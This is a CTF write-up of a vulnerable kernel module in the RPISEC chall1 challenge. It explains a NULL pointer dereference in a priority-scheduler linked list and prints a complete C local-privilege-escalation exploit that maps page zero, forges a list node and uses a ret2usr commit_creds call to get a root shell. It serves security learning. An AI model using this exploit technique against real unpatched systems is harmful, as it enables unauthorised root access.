---
title: RPISEC Kernel Challenge
date: 2026-02-25 6:00:00 +0000
categories: [CTF, Upsolve]
tags: [pwnable]
math: true
mermaid: true
media_subpath: /assets/posts/2026-02-25-RPISEC-Kernel
image:
  path: poc.png
---

## RPISEC Kernel Exploitation

### Overview

After watching the [video](https://www.youtube.com/watch?v=HtdriW7KVNE) on kernel exploitation, I decided to take things further by attempting `chall1`, the challenge provided by the organizers for viewers to solve.

The challenge consists of a vulnerable kernel module that implements a priority scheduling simulator. The underlying vulnerability is a NULL pointer dereference. Since `mmap_min_addr` was configured to 0, it was possible to map the NULL page and leverage the flaw to control the linked list head, ultimately redirecting execution to an arbitrary function.

Because the kernel was compiled without modern protections, a ret2usr technique was used to achieve privilege escalation.

### Analysis

We are given just three files `bzImage, ramfs.gz & run.sh`

```bash
mark@rwx:~/Desktop/Labs/Kernel/challs/chall1$ ls ramfs.gz bzImage 
bzImage  ramfs.gz
mark@rwx:~/Desktop/Labs/Kernel/challs/chall1$ file bzImage 
bzImage: Linux kernel x86 boot executable bzImage, version 4.9.0 (pernicious@debian) #1 Thu Feb 22 02:22:30 EST 2018, RO-rootFS, swap_dev 0X2, Normal VGA
mark@rwx:~/Desktop/Labs/Kernel/challs/chall1$ cat run.sh 
#!/bin/sh
qemu-system-x86_64 -kernel bzImage -initrd ramfs.gz -nographic -append "console=ttyS0 root=/dev/ram rw" -s 
mark@rwx:~/Desktop/Labs/Kernel/challs/chall1$
```

First thing I did was to extract the `initramfs` filesystem.

```bash
mark@rwx:~/Desktop/Labs/Kernel/challs/chall1/fs$ gunzip ramfs.gz 
mark@rwx:~/Desktop/Labs/Kernel/challs/chall1/fs$ cpio -i < ramfs 
120260 blocks
mark@rwx:~/Desktop/Labs/Kernel/challs/chall1/fs$ ls
bin  exploit  flag  init  proc  ramfs  sbin  sched.c  sched.ko  tmp  usr
mark@rwx:~/Desktop/Labs/Kernel/challs/chall1/fs$
```

So the source code of the kernel module is provided.

Looking at the `init` file we get this

```bash
#!/bin/sh
mount -t proc none /proc
mknod /dev/null c 1 3
chmod 666 /dev/null
mknod /dev/urandom c 1 9
chmod 666 /dev/urandom

insmod /sched.ko
setsid cttyhack setuidgid 1337 sh -cs 'alias gcc="gcc -static"'

umount /proc
poweroff -f
```

Basically it loads the kernel module and sets the user/group id to 1337.

From the cpu information we see that this kernel was compiled without `smap/smep/kpti` and `nokaslr` (the user can read `/proc/kallsym`)

```bash
/ $ cat /proc/cpuinfo 
processor	: 0
vendor_id	: AuthenticAMD
cpu family	: 15
model		: 107
model name	: QEMU Virtual CPU version 2.5+
stepping	: 1
microcode	: 0x1000065
cpu MHz		: 2803.249
cache size	: 512 KB
fpu		: yes
fpu_exception	: yes
cpuid level	: 13
wp		: yes
flags		: fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm rep_good nopl extd_apicid eagerfpu pni cx16 hypervisor lahf_lm l
bugs		: apic_c1e fxsave_leak sysret_ss_attrs swapgs_fence
bogomips	: 5606.49
TLB size	: 1024 4K pages
clflush size	: 64
cache_alignment	: 64
address sizes	: 40 bits physical, 48 bits virtual
power management:

/ $ head /proc/kallsyms 
ffffffff810002a0 t run_init_process
ffffffff810002a0 T _stext
ffffffff810002d0 t try_to_run_init_process
ffffffff81000310 t initcall_blacklisted
ffffffff810003b0 T do_one_initcall
ffffffff810004f0 t match_dev_by_uuid
ffffffff81000520 T name_to_dev_t
ffffffff81000950 t rootfs_mount
ffffffff81000990 W calibrate_delay_is_known
ffffffff810009a0 W calibration_delay_done
/ $ head /proc/kallsyms 
ffffffff810002a0 t run_init_process
ffffffff810002a0 T _stext
ffffffff810002d0 t try_to_run_init_process
ffffffff81000310 t initcall_blacklisted
ffffffff810003b0 T do_one_initcall
ffffffff810004f0 t match_dev_by_uuid
ffffffff81000520 T name_to_dev_t
ffffffff81000950 t rootfs_mount
ffffffff81000990 W calibrate_delay_is_known
ffffffff810009a0 W calibration_delay_done
```

So we don't have to worry about kernel leaks.

To ease exploit compilation/transfer and the filesystem compression I made use of this

```bash
#!/bin/bash

# Compress initramfs with the included statically linked exploit
in=$1
out=$(echo $in | awk '{ print substr( $0, 1, length($0)-2 ) }')
musl-gcc $in -static -o $out || exit 255
mv $out initramfs
pushd . && pushd initramfs
find . -print0 | cpio --null --format=newc -o 2>/dev/null | gzip -9 > ../ramfs.gz
popd
```

Here's the kernel module source code

```c
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/slab.h>

#define NAME "sched"

struct cpu_proc {
	struct cpu_proc* next;
	long prio;
	void (*compute)(void);
};

struct cpu_proc* head;

void high_prio(void) {printk(KERN_INFO "I'm kind of a big deal... People know me.\n");}
void med_prio(void) {printk(KERN_INFO "That's not my wallet...\n");}
void low_prio(void) {printk(KERN_INFO "We always find something, eh Didi, to give us the impression we exist?\n");}
void other_prio(void) {
	printk(KERN_INFO "What do we do now?\n");
	printk(KERN_INFO "Wait.\n");
	printk(KERN_INFO "Yes, but while waiting.\n");
	printk(KERN_INFO "What about hanging ourselves?\n");
	printk(KERN_INFO "Hmm. It'd give us an erection.\n");
}

struct cpu_proc* make_proc(long prio) {
	struct cpu_proc* pr = kmalloc(sizeof(struct cpu_proc), GFP_KERNEL);
	pr->next = NULL;
	pr->prio = prio;
	switch (prio) {
		case 0:
			pr->compute = high_prio;
			break;
		case 1:
			pr->compute = med_prio;
			break;
		case 2:
			pr->compute = low_prio;
			break;
		default:
			pr->compute = other_prio;
			break;
	}
	return pr;
}

void add_proc(struct cpu_proc* pr) {
	if (!head)
		head = pr;
	else {
		struct cpu_proc* tail = head;
		while (tail->next)
			tail = tail->next;
		tail->next = pr;
	}
}

struct cpu_proc* pop_proc(void) {
	struct cpu_proc* cur = head, *prev = NULL;
	struct cpu_proc* min = cur, *minPrev = prev;
	while (cur) {
		if (cur->prio < min->prio) {
			min = cur;
			minPrev = prev;
		}
		prev = cur;
		cur = cur->next;
	}
	if (!minPrev)
		head = min->next;
	else
		minPrev->next = min->next;
	return min;
}
 
static ssize_t proc_write(struct file* file, const char* buf, size_t len, loff_t* off) {
	long prio;
	if (sscanf(buf, "%ld", &prio) != 1) {
		printk(KERN_INFO "[x] expected long, not: %s\n", buf);
		return -EINVAL;
	}
	add_proc(make_proc(prio));
	printk(KERN_INFO "[+] added process with priority %ld\n", prio);
	return len;
}

static ssize_t proc_read(struct file* file, char* buf, size_t len, loff_t* off) {
	struct cpu_proc* pr = pop_proc();
	if (!pr)
		printk(KERN_INFO "[!] pls no hack me :P\n");
	else {
		pr->compute();
		printk(KERN_INFO "[+] ran process with priority: %ld\n", pr->prio);
	}
	return 0;
}

static const struct file_operations proc_ops = {
	.owner = THIS_MODULE,
	.write = proc_write,
	.read = proc_read
};

static int __init m_init(void) {
	struct proc_dir_entry* procfile = proc_create(NAME, 0666, 0, &proc_ops);
	if (!procfile) {
		printk(KERN_INFO "[!] couldnt create proc entry\n");
		return -ENOMEM;
	}
	printk(KERN_INFO "[+] scheduler module loaded\n");
	printk(KERN_INFO "[+] priority scheduling simulator\n");
	printk(KERN_INFO "[+] add process to queue with priority: echo '7' > /proc/sched\n");
	printk(KERN_INFO "[+] remove next process from queue: cat /proc/sched\n");
	add_proc(make_proc(1));
	add_proc(make_proc(0));
	add_proc(make_proc(2));
	add_proc(make_proc(51));
	printk(KERN_INFO "[+] sample processes queued\n");
	return 0;
}

static void __exit m_exit(void) {
	remove_proc_entry(NAME, 0);
	printk(KERN_INFO "[+] scheduler module unloaded\n");
	//what's a memory leak??
}

MODULE_LICENSE("GPL");
module_init(m_init);
module_exit(m_exit);
```

When the module is loaded with `insmod` the function `m_init` gets called

```c
static int __init m_init(void) {
	struct proc_dir_entry* procfile = proc_create(NAME, 0666, 0, &proc_ops);
	if (!procfile) {
		printk(KERN_INFO "[!] couldnt create proc entry\n");
		return -ENOMEM;
	}
	printk(KERN_INFO "[+] scheduler module loaded\n");
	printk(KERN_INFO "[+] priority scheduling simulator\n");
	printk(KERN_INFO "[+] add process to queue with priority: echo '7' > /proc/sched\n");
	printk(KERN_INFO "[+] remove next process from queue: cat /proc/sched\n");
	add_proc(make_proc(1));
	add_proc(make_proc(0));
	add_proc(make_proc(2));
	add_proc(make_proc(51));
	printk(KERN_INFO "[+] sample processes queued\n");
	return 0;
}
```

After creating a character device exposed at `/proc/sched`, the program proceeds to create simulated "processes" with predefined priority levels. Note that this is only a simulation no real processes are actually created.

The data structure used to manage process priorities is named `cpu_proc`. It is implemented as a linked list, where each node stores a priority level and a pointer to its corresponding function handler.

```c
struct cpu_proc {
	struct cpu_proc* next;
	long prio;
	void (*compute)(void);
};

struct cpu_proc* head;
```

Here's the insertion logic.

The `make_proc` function dynamically allocates a new `cpu_proc` structure using `kmalloc`. After initializing its next pointer to NULL and assigning the provided priority value, it selects the appropriate handler based on the priority level.

The handler is assigned via a switch statement, mapping each priority level to its corresponding function (high_prio, med_prio, low_prio, or a default handler).

The `add_proc` function inserts the newly created node into the linked list. If the list is empty, the new node becomes the head. Otherwise, the function traverses the list until it reaches the final node and appends the new process to the end. 

```c
struct cpu_proc* make_proc(long prio) {
	struct cpu_proc* pr = kmalloc(sizeof(struct cpu_proc), GFP_KERNEL);
	pr->next = NULL;
	pr->prio = prio;
	switch (prio) {
		case 0:
			pr->compute = high_prio;
			break;
		case 1:
			pr->compute = med_prio;
			break;
		case 2:
			pr->compute = low_prio;
			break;
		default:
			pr->compute = other_prio;
			break;
	}
	return pr;
}

void add_proc(struct cpu_proc* pr) {
	if (!head)
		head = pr;
	else {
		struct cpu_proc* tail = head;
		while (tail->next)
			tail = tail->next;
		tail->next = pr;
	}
}
```

The registered module file operations are defined here:

```c
static const struct file_operations proc_ops = {
	.owner = THIS_MODULE,
	.write = proc_write,
	.read = proc_read
};
```

`proc_write` parses a priority value from userspace, creates a corresponding `cpu_proc` node, appends it to the linked list, and logs the operation. In short, it inserts a new priority entry into the scheduler list.

```c
static ssize_t proc_write(struct file* file, const char* buf, size_t len, loff_t* off) {
	long prio;
	if (sscanf(buf, "%ld", &prio) != 1) {
		printk(KERN_INFO "[x] expected long, not: %s\n", buf);
		return -EINVAL;
	}
	add_proc(make_proc(prio));
	printk(KERN_INFO "[+] added process with priority %ld\n", prio);
	return len;
}
```

`proc_read` removes the highest-priority process from the scheduler list and invokes its associated handler function.

```c
static ssize_t proc_read(struct file* file, char* buf, size_t len, loff_t* off) {
	struct cpu_proc* pr = pop_proc();
	if (!pr)
		printk(KERN_INFO "[!] pls no hack me :P\n");
	else {
		pr->compute();
		printk(KERN_INFO "[+] ran process with priority: %ld\n", pr->prio);
	}
	return 0;
}

struct cpu_proc* pop_proc(void) {
	struct cpu_proc* cur = head, *prev = NULL;
	struct cpu_proc* min = cur, *minPrev = prev;
	while (cur) {
		if (cur->prio < min->prio) {
			min = cur;
			minPrev = prev;
		}
		prev = cur;
		cur = cur->next;
	}
	if (!minPrev)
		head = min->next;
	else
		minPrev->next = min->next;
	return min;
}
```

### Vulnerability

The vulnerability exists in `pop_proc`, where the function assumes that `head` is non-NULL. It does not validate whether the scheduler list is empty before attempting to locate and unlink the highest-priority process.

If `head` is `NULL`, both `cur` and `min` are initialized to NULL. When execution reaches:

```c
if (!minPrev)
    head = min->next;   // NULL pointer dereference
```

the code dereferences `min`, which is `NULL`, resulting in a kernel NULL pointer dereference.

To trigger this condition, we can remove all processes from the list. 

Once the list becomes empty, `head` is set to `NULL`. A subsequent call to `pop_proc` will then operate on a NULL head pointer, leading to the crash.

But how to exploit this?

### Exploitation

From the `mmap` manual page:

![mmap](mmap.png)

```
If addr is NULL, then the kernel chooses the (page-aligned) address at which to create the mapping; this is the most portable method of creating a new mapping.  If  addr  is  not NULL, then the kernel takes it as a hint about where to place the mapping; on Linux, the kernel will pick a nearby page boundary (but always above or equal to the value specified by /proc/sys/vm/mmap_min_addr) and attempt to create the mapping there.
```

This means that `/proc/sys/vm/mmap_min_addr` defines the lowest virtual memory address that a process is permitted to map.

Inspecting the running kernel configuration shows that `/proc/sys/vm/mmap_min_addr` is set to 0. This means userland is permitted to map memory at address 0x0.

```bash
/ $ cat /proc/sys/vm/mmap_min_addr
0
/ $ 
```

As a result, it becomes possible to deliberately map a controlled memory region at address 0. When the NULL pointer dereference in `pop_proc` occurs, the kernel will dereference a pointer at address 0, allowing the attacker to control the data being accessed.

Although `proc_read` contains a check:

```c
struct cpu_proc* pr = pop_proc();
if (!pr)
	printk(KERN_INFO "[!] pls no hack me :P\n");
```

This isn't a problem because by crafting a fake `cpu_proc` structure at address `0` and setting its next pointer to a controlled memory region, a call to `pop_proc` will update head to the controlled memory.

And with this we've hijacked the `cpu_proc` structure.

Since we can then make any arbitrary function call, we simply set the `compute` field to a userspace function which would update the process credential and after we return from the file operation (proc_read) we can then spawn a shell!

Here's my exploit script:

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include "log.h"

#define SIZE 4

typedef struct cpu_proc {
    struct cpu_proc *next;
    long prio;
    void (*compute)(void);
} cpu_proc;

uint32_t pr_size = sizeof(cpu_proc);

uint64_t prepare_kernel_cred = 0xffffffff8104f850;
uint64_t commit_creds = 0xffffffff8104f520;

void spawn_shell()
{
    logInfo("Escalating privilege..")
    if (getuid() == 0) {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        execve(argv[0], argv, envp);
    } else {
        errExit("Privilege escalation failed");
    }
}

void privesc() {
    asm(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "mov r15, prepare_kernel_cred;"
        "call r15;"
        "mov rdi, rax;"
        "mov r15, commit_creds;"
        "call r15;"
        ".att_syntax"
    );

}

void pop_queue() {
    read(fd, &prio, sizeof(prio));
}

void push_queue(char *prio_level) {
    write(fd, prio_level, 2);
}

void clear_proc(void) {
    logInfo("Clearing process queue...");
    for (int i = 0; i < (SIZE); i++) {
        pop_queue();
    }
    logOK("Done!");
}

int main(void) {

    fd = open("/proc/sched", O_RDWR);
    if (fd == -1)
        errExit("open");

    clear_proc();

    logInfo("Allocating memory for null pointer deference..");
    void *addr = mmap(0, 0x1000,
                    PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,
                    -1, 0);

    void *new_list = mmap((void *)0xdead0000, 0x1000,
                        PROT_READ|PROT_WRITE|PROT_EXEC,
                        MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,
                        -1, 0);

    if (addr != 0 || new_list != (void *)0xdead0000) {
        errExit("mmap");
    }

    *(uint64_t *)addr = (uint64_t)new_list;

    logInfo("Corrupting linked list [head]..");
    pop_queue();

    struct cpu_proc *pr = malloc(pr_size);
    pr->next = NULL;
    pr->prio = 1;
    pr->compute = privesc;

    logInfo("Forging fake cpu_proc struct..");
    memcpy(new_list, pr, pr_size);
    push_queue("5");
    
    logInfo("Triggering function pointer..");
    pop_queue();

    spawn_shell();

    return 0;
}
```

Running it, we achieve LPE!

![lpe](lpe.png)
